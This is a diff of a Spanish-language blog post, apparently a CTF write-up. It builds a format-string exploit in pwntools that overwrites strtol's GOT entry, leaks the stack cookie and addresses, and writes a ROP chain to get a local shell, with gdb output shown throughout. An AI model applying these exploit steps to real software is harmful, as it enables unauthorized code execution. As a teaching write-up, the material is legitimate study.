+<p class="plain-text">Ahora nuestro exploit luce de esta forma, luego de definir la función escribimos en la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> la dirección hacia la función <code class="language-plaintext highlighter-rouge">getenv</code>, esto lo podemos comprobar desde <code class="language-plaintext highlighter-rouge">gdb</code>, ahora al llamar a <code class="language-plaintext highlighter-rouge">strtol</code> en realidad llamará a <code class="language-plaintext highlighter-rouge">getenv</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64
@@ -430,7 +430,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
 
-libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">
 
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 shell.interactive()</span>
@@ -441,13 +441,13 @@ shell.interactive()</span>
 Program received signal SIGINT, Interrupt.
 </span><span class="az">0x00007382ccd147e2</span><span class="p"> in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> x/gx 0x404030
-</span><span class="az">0x404030 </span><span class="p">&lt</span><span class="am">strtol@got.plt</span><span class="p">>:      0x00007382ccc44b70  
+</span><span class="az">0x404030 </span><span class="p">&lt</span><span class="am">strtol@got.plt</span><span class="p">>:      0x00007382ccc44b70
 </span><span class="ro">pwndbg></span><span class="p"> x/gx *(long long *)(0x404030)
-</span><span class="az">0x7382ccc44b70</span><span class="p"> &lt</span><span class="am">getenv</span><span class="p">>:        0x56415741fa1e0ff3  
+</span><span class="az">0x7382ccc44b70</span><span class="p"> &lt</span><span class="am">getenv</span><span class="p">>:        0x56415741fa1e0ff3
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez la condición se cumple podemos hacer leaks mas allá de la posición <code class="language-plaintext highlighter-rouge">57</code></p>
+<p class="plain-text">Una vez la condición se cumple podemos hacer leaks mas allá de la posición <code class="language-plaintext highlighter-rouge">57</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
@@ -460,7 +460,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
 
-libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">
 
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 
@@ -473,11 +473,11 @@ write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El leak de la posición <code class="language-plaintext highlighter-rouge">59</code> muestra la stack cookie, lo sabemos porque termina con el byte <code class="language-plaintext highlighter-rouge">00</code>, además la posición <code class="language-plaintext highlighter-rouge">65</code> muestra una dirección perteneciente al stack</p>
+<p class="plain-text">El leak de la posición <code class="language-plaintext highlighter-rouge">59</code> muestra la stack cookie, lo sabemos porque termina con el byte <code class="language-plaintext highlighter-rouge">00</code>, además la posición <code class="language-plaintext highlighter-rouge">65</code> muestra una dirección perteneciente al stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1249736
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']
 [</span><span class="az">*</span><span class="p">] 50: 0x404037
 [</span><span class="az">*</span><span class="p">] 51: 0x404033
 [</span><span class="az">*</span><span class="p">] 52: 0x404031
@@ -506,13 +506,13 @@ shell.interactive()</span>
 <code><span class="ro">pwndbg></span><span class="p"> vmmap 0x7ffdab10fb98
 LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA </span><span class="p">| </span><span class="ro">WX</span><span class="p"> | RODATA
              Start                End Perm     Size Offset File
-</span><span class="sa">    0x71953d1eb000     0x71953d1ed000 rw-p     2000  39000 /home/user/ld-linux-x86-64.so.2  
+</span><span class="sa">    0x71953d1eb000     0x71953d1ed000 rw-p     2000  39000 /home/user/ld-linux-x86-64.so.2
 </span><span class="am">►   0x7ffdab0f1000     0x7ffdab112000 rw-p    21000      0 [stack] +0x1eb98
 </span><span class="p">    0x7ffdab11b000     0x7ffdab11f000 r--p     4000      0 [vvar]
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez hacemos el leak del stack restauramos <code class="language-plaintext highlighter-rouge">strtol</code> por su valor inicial, entonces si intentamos mostrar un valor mayor a <code class="language-plaintext highlighter-rouge">57</code> saldrá del programa lo que quiere decir que llegará al <code class="language-plaintext highlighter-rouge">ret</code> del <code class="language-plaintext highlighter-rouge">main</code> para salir, podemos usar ese <code class="language-plaintext highlighter-rouge">ret</code> para ejecutar un ropchain</p>
+<p class="plain-text">Una vez hacemos el leak del stack restauramos <code class="language-plaintext highlighter-rouge">strtol</code> por su valor inicial, entonces si intentamos mostrar un valor mayor a <code class="language-plaintext highlighter-rouge">57</code> saldrá del programa lo que quiere decir que llegará al <code class="language-plaintext highlighter-rouge">ret</code> del <code class="language-plaintext highlighter-rouge">main</code> para salir, podemos usar ese <code class="language-plaintext highlighter-rouge">ret</code> para ejecutar un ropchain.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="p"> gdb, p64, u64, log
@@ -525,7 +525,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
 
-libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
@@ -539,18 +539,18 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez llegamos al breakpoint del <code class="language-plaintext highlighter-rouge">ret</code> en <code class="language-plaintext highlighter-rouge">main+300</code> podemos ver el valor del registro <code class="language-plaintext highlighter-rouge">rsp</code>, si restamos el valor del leak a el nos da un offset de <code class="language-plaintext highlighter-rouge">0x110</code> bytes, si escribimos en la dirección de <code class="language-plaintext highlighter-rouge">rsp</code> al llegar al <code class="language-plaintext highlighter-rouge">ret</code> ejecutará lo que escribamos ahí</p>
+<p class="plain-text">Una vez llegamos al breakpoint del <code class="language-plaintext highlighter-rouge">ret</code> en <code class="language-plaintext highlighter-rouge">main+300</code> podemos ver el valor del registro <code class="language-plaintext highlighter-rouge">rsp</code>, si restamos el valor del leak a el nos da un offset de <code class="language-plaintext highlighter-rouge">0x110</code> bytes, si escribimos en la dirección de <code class="language-plaintext highlighter-rouge">rsp</code> al llegar al <code class="language-plaintext highlighter-rouge">ret</code> ejecutará lo que escribamos ahí.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1272760
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']
 [</span><span class="az">*</span><span class="p">] Stack leak: 0x7ffc5b8e4218
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00000000004014a6 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()  
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00000000004014a6 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rsp
 </span><span class="az">$1</span><span class="p"> = 0x7ffc5b8e4108
 </span><span class="ro">pwndbg></span><span class="p"> p/x 0x7ffc5b8e4218 - 0x7ffc5b8e4108
@@ -558,7 +558,7 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestro exploit calcula la posición del <code class="language-plaintext highlighter-rouge">rsp</code> cuando llegamos al <code class="language-plaintext highlighter-rouge">ret</code> luego escribe ahí con la primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code> el ropchain una dirección a la vez hasta completarlo</p>
+<p class="plain-text">Nuestro exploit calcula la posición del <code class="language-plaintext highlighter-rouge">rsp</code> cuando llegamos al <code class="language-plaintext highlighter-rouge">ret</code> luego escribe ahí con la primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code> el ropchain una dirección a la vez hasta completarlo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, u64
@@ -596,7 +596,7 @@ shell</span><span class="o"> =</span><span class="p"> process(</span><span class
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
 
-libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
@@ -613,10 +613,10 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego de escribir el ropchain y obligar ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> intentando acceder a una posición invalida como <code class="language-plaintext highlighter-rouge">58</code>, se ejecuta lo que escribimos y obtenemos una shell</p>
+<p class="plain-text">Luego de escribir el ropchain y obligar ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> intentando acceder a una posición invalida como <code class="language-plaintext highlighter-rouge">58</code>, se ejecuta lo que escribimos y obtenemos una shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './chall': pid 1283781  
+[</span><span class="ve">+</span><span class="p">] Starting local process './chall': pid 1283781
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=1000(user) gid=1000(user) groups=1000(user)
